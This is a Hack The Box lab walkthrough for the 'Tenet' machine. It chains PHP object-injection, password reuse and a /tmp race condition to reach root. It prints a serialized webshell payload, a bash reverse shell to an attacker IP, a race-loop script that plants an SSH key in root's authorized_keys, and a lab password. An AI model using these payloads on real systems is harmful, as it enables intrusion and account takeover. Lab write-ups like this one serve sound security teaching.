# Tenet - Comprehensive Walkthrough

**Machine:** Tenet  
**Platform:** Hack The Box  
**IP:** `10.129.2.149`  
**Difficulty:** Medium  
**Path:** PHP Deserialization → Credential Reuse → Race Condition

---

## Table of Contents
1. [Initial Reconnaissance](#1-initial-reconnaissance)
2. [Web Enumeration & The Vhost Problem](#2-web-enumeration--the-vhost-problem)
3. [Finding sator.php and Its Backup](#3-finding-satorphp-and-its-backup)
4. [Understanding PHP Object Injection](#4-understanding-php-object-injection)
5. [Exploiting Deserialization to Get a Webshell](#5-exploiting-deserialization-to-get-a-webshell)
6. [From Webshell to Reverse Shell](#6-from-webshell-to-reverse-shell)
7. [Privilege Escalation to User (Neil)](#7-privilege-escalation-to-user-neil)
8. [Privilege Escalation to Root (Race Condition)](#8-privilege-escalation-to-root-race-condition)
9. [Hacker Mindset Summary](#9-hacker-mindset-summary)

---

## 1. Initial Reconnaissance

### What we do:
Every penetration test begins with reconnaissance. We need to understand what services are running, what ports are open, and what the attack surface looks like.

```bash
nmap -sS -sC -sV -p- 10.129.2.149
```

Or a faster version:
```bash
nmap -p- --min-rate 10000 10.129.2.149
nmap -p 22,80 -sC -sV 10.129.2.149
```

### Results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### Hacker Mindset:
> "Two ports. SSH and HTTP. SSH is usually a dead end without credentials, so we focus on HTTP first. Web applications are the largest attack surface on most machines. The Apache version tells us it's likely Ubuntu 18.04 Bionic — this might be useful later if we need to know what packages or kernel versions to expect."

**Key insight:** SSH without credentials is a brick wall. HTTP is where we'll find our foothold.

---

## 2. Web Enumeration & The Vhost Problem

### What we do:
We visit the IP directly in a browser or with curl:

```bash
curl -s http://10.129.2.149/ | head
```

We see the **Apache2 Ubuntu Default Page**. This means the server is hosting something, but the default vhost is just a placeholder.

### Directory Enumeration:
```bash
gobuster dir -u http://10.129.2.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php
```

### Results:
- `/users.txt` — contains just the word "Success"
- `/wordpress` — a WordPress installation

### The Vhost Problem:
When we visit `http://10.129.2.149/wordpress/`, the page looks broken — CSS is missing, images don't load, links point to `tenet.htb`.

**Why?** WordPress hardcodes its domain name in the database and configuration. When the server receives a request for the IP address, WordPress generates links for `tenet.htb`, but our browser can't resolve that domain.

### Fix:
```bash
echo "10.129.2.149 tenet.htb" | sudo tee -a /etc/hosts
```

Now browse to `http://tenet.htb`.

### Hacker Mindset:
> "When a site looks broken with missing CSS, that's not a bug — it's a clue. It means the application expects a specific hostname. Always check the page source for hardcoded domains. WordPress is particularly notorious for this. Adding the domain to `/etc/hosts` is a standard step in web penetration testing."

---

## 3. Finding sator.php and Its Backup

### What we do:
We browse the WordPress site. There's a post called "Migration" with an interesting comment from a user named **neil**:

> "did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!"

### Key Intelligence Extracted:
1. A username: **`neil`**
2. A file named **`sator.php`**
3. There is a **backup** of this file

### Searching for sator.php:
We check both the IP and the vhost:

```bash
curl -s http://tenet.htb/sator.php        # 404 Not Found
curl -s http://10.129.2.149/sator.php     # Found!
```

Output:
```
[+] Grabbing users from text file <br>
[] Database updated <br>
```

### Finding the Backup:
Neil mentioned a backup. Common backup extensions: `.bak`, `.backup`, `.old`, `.swp`, `~`.

```bash
curl -s http://10.129.2.149/sator.php.bak
```

**Jackpot.** We get the full PHP source code.

### Hacker Mindset:
> "Comments on blog posts are goldmines. Developers and users reveal internal file names, usernames, and architecture details all the time. The mention of a 'backup' is a massive red flag — developers often leave backup files on web servers, and these files usually aren't parsed by the web server, meaning we get to read the raw source code. Always check for backup files when you find an interesting endpoint. Also notice that `sator.php` exists on the IP but not the vhost — this suggests different virtual host configurations or a forgotten file."

---

## 4. Understanding PHP Object Injection

### The Vulnerable Code (sator.php.bak):
```php
<?php
class DatabaseExport
{
    public $user_file = 'users.txt';
    public $data = '';

    public function update_db()
    {
        echo '[+] Grabbing users from text file <br>';
        $this->data = 'Success';
    }

    public function __destruct()
    {
        file_put_contents(__DIR__ . '/' . $this->user_file, $this->data);
        echo '[] Database updated <br>';
    }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app->update_db();
?>
```

### Breaking Down the Vulnerability:

#### What is Serialization?
In programming, **serialization** is the process of converting an object (a data structure in memory) into a format that can be stored or transmitted. **Deserialization** is the reverse — converting that stored format back into an object in memory.

In PHP, you serialize an object like this:
```php
$object = new DatabaseExport;
echo serialize($object);
// Output: O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:0:"";}
```

#### The Danger: `unserialize()` on User Input
The code takes user input (`$_GET['arepo']`) and passes it directly to `unserialize()`:

```php
$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
```

This means **we control what object is created in memory**.

#### The Magic Method: `__destruct()`
PHP has "magic methods" that are called automatically under certain conditions. `__destruct()` is called when an object is destroyed (at the end of the script, or when it goes out of scope).

Look at what `__destruct()` does:
```php
public function __destruct()
{
    file_put_contents(__DIR__ . '/' . $this->user_file, $this->data);
}
```

It writes `$this->data` to `$this->user_file`.

#### The Attack:
Since we control the serialized object, we can:
1. Create a `DatabaseExport` object
2. Set `$user_file` to any filename we want (e.g., `shell.php`)
3. Set `$data` to any content we want (e.g., a PHP webshell)
4. Serialize it and send it to `sator.php?arepo=...`
5. When the script ends, PHP destroys our object, calling `__destruct()`
6. `__destruct()` writes our malicious data to our chosen filename

### Hacker Mindset:
> "The moment you see `unserialize()` with user-controlled input, your brain should scream 'PHP Object Injection.' This is a classic vulnerability. The `__destruct()` method is our weapon — it's called automatically, and it performs a dangerous action (writing to a file). We don't need to execute code directly; we just need to craft an object that, when destroyed, does something useful for us. This is called a 'POP chain' (Property-Oriented Programming) — we're chaining object properties to achieve code execution."

---

## 5. Exploiting Deserialization to Get a Webshell

### Crafting the Payload:
We create a PHP script to generate the serialized object:

```php
<?php
class DatabaseExport {
    public $user_file = "shell.php";
    public $data = '<?php system($_REQUEST["cmd"]); ?>';
}

$sploit = new DatabaseExport;
echo urlencode(serialize($sploit));
?>
```

Or as a one-liner:
```bash
php -r 'class DatabaseExport { public $user_file = "shell.php"; public $data = "<?php system(\$_REQUEST[\"cmd\"]); ?>"; } echo urlencode(serialize(new DatabaseExport));'
```

Output:
```
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A34%3A%22%3C%3Fphp+system%28%24_REQUEST%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D
```

### Triggering the Exploit:
```bash
curl -s "http://10.129.2.149/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A34%3A%22%3C%3Fphp+system%28%24_REQUEST%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D"
```

Expected output:
```
[+] Grabbing users from text file <br>
[] Database updated <br>[] Database updated <br>
```

Notice `Database updated` appears **twice** — once for the `$app` object created in the script, and once for our injected object.

### Verifying the Webshell:
```bash
curl -s "http://10.129.2.149/shell.php?cmd=id"
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Hacker Mindset:
> "We're not just blindly throwing exploits. We verify each step. The webshell gives us command execution, but it's fragile — every command requires an HTTP request. We use it as a stepping stone to get a proper interactive shell. The `id` command confirms we're `www-data`, the Apache user. This is expected and means we need to escalate privileges."

---

## 6. From Webshell to Reverse Shell

### Why We Need a Reverse Shell:
A webshell is clumsy. We can't:
- Use interactive commands (like `su`, `vim`, or `bash`)
- See output from long-running commands easily
- Navigate the filesystem efficiently

A **reverse shell** gives us a direct network connection where we can interact with the target's shell.

### Setting Up the Listener:
On our Kali machine:
```bash
nc -lnvp 4444
```

This tells Netcat to **listen** on port 4444, **verbosely**, and not resolve DNS.

### Triggering the Reverse Shell:
We use the webshell to execute a bash reverse shell:

```bash
curl -s "http://10.129.2.149/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.6%2F4444%200%3E%261%27"
```

Or in plain English, the command being executed on the server is:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'
```

### How the Reverse Shell Works:
- `bash -i` starts an interactive bash shell
- `>& /dev/tcp/10.10.14.6/4444` redirects stdout and stderr to a TCP connection to our machine
- `0>&1` redirects stdin to the same TCP connection

The result: the target's bash shell is piped over the network to our Netcat listener.

### Upgrading the Shell:
When we first catch the shell, it's basic — no job control, no command history, no clear screen.

```bash
python3 -c 'import pty;pty.spawn("bash")'
```

Then:
1. Press `Ctrl+Z` to background the shell
2. On Kali: `stty raw -echo; fg`
3. Type `reset` and press Enter
4. If asked for terminal type, type `xterm`

### Hacker Mindset:
> "A reverse shell is about creating a persistent communication channel. The webshell is a door; the reverse shell is a hallway we can walk through. Upgrading to a PTY (pseudo-terminal) is crucial — many privilege escalation techniques require an interactive shell. Without it, `su`, `sudo`, and many other tools won't work properly."

---

## 7. Privilege Escalation to User (Neil)

### Enumeration as www-data:
Now that we have a shell, we look around:

```bash
ls /home
# Output: neil
```

One user: `neil`.

### Finding Credentials:
WordPress stores database credentials in `wp-config.php`. Since WordPress is running on this server, let's check:

```bash
grep -A2 "DB_PASSWORD" /var/www/html/wordpress/wp-config.php
```

Output:
```php
define( 'DB_USER', 'neil' );
define( 'DB_PASSWORD', 'Opera2112' );
```

### Credential Reuse:
People reuse passwords. The database password is very likely Neil's user password too.

```bash
su - neil
# Password: Opera2112
```

Success! Now we're `neil`.

### Grab the User Flag:
```bash
cat ~/user.txt
# 822953[redacted]5e17618d
```

### Hacker Mindset:
> "Credential reuse is one of the most common and effective privilege escalation techniques. Developers and administrators often use the same password across multiple services. WordPress config files, database configuration files, and environment files are the first places to check for passwords. When you find a password, always try it for SSH, `su`, and sudo. The path of least resistance is using what you already have."

---

## 8. Privilege Escalation to Root (Race Condition)

### Checking sudo Privileges:
```bash
sudo -l
```

Output:
```
User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

Neil can run `/usr/local/bin/enableSSH.sh` as **root without a password**.

### Analyzing the Script:
```bash
cat /usr/local/bin/enableSSH.sh
```

Full script:
```bash
#!/bin/bash

checkAdded() {
    sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
    if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
        /bin/echo "Successfully added $sshName to authorized_keys file!"
    else
        /bin/echo "Error in adding $sshName to authorized_keys file!"
    fi
}

checkFile() {
    if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
        /bin/echo "Error in creating key file!"
        if [[ -f $1 ]]; then /bin/rm $1; fi
        exit 1
    fi
}

addKey() {
    tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
    (umask 110; touch $tmpName)
    /bin/echo $key >>$tmpName
    checkFile $tmpName
    /bin/cat $tmpName >>/root/.ssh/authorized_keys
    /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

### Understanding the Script's Logic:
1. `mktemp -u /tmp/ssh-XXXXXXXX` — generates a random filename like `/tmp/ssh-a1B2c3D4`
2. `touch $tmpName` — creates the empty file (with umask 110 = permissions 666, so anyone can read/write)
3. `/bin/echo $key >>$tmpName` — appends the hardcoded SSH public key to the temp file
4. `checkFile $tmpName` — verifies the file exists and has content
5. `/bin/cat $tmpName >>/root/.ssh/authorized_keys` — appends the temp file to root's authorized keys
6. `/bin/rm $tmpName` — deletes the temp file

### The Vulnerability: Race Condition
A **race condition** occurs when the behavior of a system depends on the relative timing of events — specifically, when one process is supposed to complete actions in a sequence, but another process can interfere between those actions.

In this script:
- The file is created (step 2)
- The hardcoded key is written (step 3)
- The file is copied to authorized_keys (step 5)
- The file is deleted (step 6)

**The race window is between step 3 and step 5.** If we can overwrite the temp file with **our own SSH public key** after the hardcoded key is written but before the file is copied, then **our key** gets appended to `/root/.ssh/authorized_keys` instead!

### Why This Works:
- The file is created in `/tmp` with permissions `666` (world-writable)
- We (as `neil`) have permission to write to it
- The script runs as `root` via `sudo`
- But the temp file itself is writable by anyone

### Preparing Our SSH Key:
On Kali, we generate a new key pair:
```bash
ssh-keygen -t ed25519 -f ~/.ssh/tenet_root -N ""
```

View the public key:
```bash
cat ~/.ssh/tenet_root.pub
```

Output:
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlnj7ks9gYalWQV1v8CmSpeSwO6Nh8+W3XXQU8+5J7K kali@kali
```

### The Attack: Racing the Temp File
We need two things happening simultaneously:
1. **A loop** that constantly overwrites any `/tmp/ssh-*` file with our public key
2. **The script** running via `sudo`

#### Terminal 1: The Race Loop
We create a Python script that watches `/tmp` for files starting with `ssh-` and overwrites them instantly:

```bash
cat > /tmp/race.py << 'EOF'
import os
key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlnj7ks9gYalWQV1v8CmSpeSwO6Nh8+W3XXQU8+5J7K kali@kali\n"
while True:
    for entry in os.scandir("/tmp"):
        if entry.name.startswith("ssh-") and entry.is_file():
            with open(entry.path, "w") as fh:
                fh.write(key)
EOF
```

Run multiple instances in parallel for better odds:
```bash
for i in {1..5}; do python3 /tmp/race.py & done
```

#### Terminal 2: Running the Script
While the loops are running, we execute the vulnerable script repeatedly:

```bash
for i in {1..30}; do sudo /usr/local/bin/enableSSH.sh; done
```

### What Happens:
- Most runs will say: `Successfully added root@ubuntu to authorized_keys file!` (the hardcoded key won)
- Eventually, one run will say: `Error in adding root@ubuntu to authorized_keys file!` (our key won!)

The "Error" message is actually **success for us** — it means `checkAdded()` couldn't find `root@ubuntu` in `authorized_keys` because our key (with comment `kali@kali`) was written instead.

### SSH as Root:
Once our key is in `/root/.ssh/authorized_keys`:

```bash
ssh -i ~/.ssh/tenet_root -o StrictHostKeyChecking=no root@10.129.2.149
```

We get a root shell:
```
root@tenet:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Grab the Root Flag:
```bash
cat /root/root.txt
# 1c1baf[redacted]d1ff7fba7
```

### Hacker Mindset:
> "Race conditions are subtle but powerful. The developer assumed that because they created the file, wrote to it, and then read from it, no one could interfere. But in a multi-user system, files in world-writable directories like `/tmp` are shared territory. The key insight is: **the file is writable by anyone from the moment it's created until it's deleted.** We don't need to predict the random filename — we just need to be faster than the script. Running multiple parallel watchers increases our odds because the file exists for only milliseconds. This is a classic Time-of-Check to Time-of-Use (TOCTOU) vulnerability."

---

## 9. Hacker Mindset Summary

### Reconnaissance Phase
- **Start broad, then narrow.** We scanned all ports, found two services, and focused on HTTP.
- **Every broken page is a clue.** The broken WordPress site told us about vhosts.
- **Comments are intelligence gold.** Neil's comment gave us usernames, filenames, and the existence of a backup.

### Exploitation Phase
- **Source code is the ultimate target.** Finding `sator.php.bak` gave us the entire attack vector.
- **Understand the language.** Knowing PHP magic methods (`__destruct`) let us recognize the deserialization vulnerability instantly.
- **Verify each step.** We checked the webshell with `?cmd=id` before attempting a reverse shell.

### Post-Exploitation Phase
- **Config files contain passwords.** `wp-config.php` is a standard target and delivered Neil's password.
- **Credential reuse is real.** The database password was the user password.
- **Always check `sudo -l`.** It revealed our path to root with zero effort.
- **Read every script you can run as root.** Understanding `enableSSH.sh` revealed the race condition.
- **World-writable directories are dangerous.** `/tmp` with permissive umask values is a classic privilege escalation vector.

### General Principles
1. **Be methodical.** Don't skip steps. Each piece of information builds on the last.
2. **Think like the developer.** They left a backup, they reused passwords, they didn't secure `/tmp` — these are human mistakes.
3. **Persistence beats brilliance.** The race condition required multiple attempts. Many exploits fail the first time.
4. **Minimize your footprint.** Use simple tools (curl, Python, bash) that don't require uploading large binaries.
5. **Chain vulnerabilities.** No single vulnerability gave us root. We chained: deserialization → credential reuse → race condition.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `8229530[redacted]e17618d` |
| root.txt | `1c1baf2[redacted]1ff7fba7` |

---

*Walkthrough completed. Happy hacking!*
